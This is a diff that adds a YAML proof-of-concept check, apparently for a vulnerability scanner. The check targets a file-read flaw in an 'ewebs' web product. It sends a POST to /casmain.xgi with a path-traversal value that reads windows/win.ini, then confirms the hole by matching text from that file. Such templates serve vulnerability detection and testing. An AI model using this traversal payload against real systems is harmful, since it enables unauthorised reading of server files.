@@ -1,0 +1,21 @@
+name: poc-yaml-ewebs-fileread
+manual: true
+transport: http
+rules:
+    windows0:
+        request:
+            cache: true
+            method: POST
+            path: /casmain.xgi
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: Language_S=../../../../windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+expression: windows0()
+detail:
+    author: albertchang(https://github.com/albertchang)
+    links:
+        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/lzqqz4
+    vulnerability:
+        id: CT-416457
+        level: medium
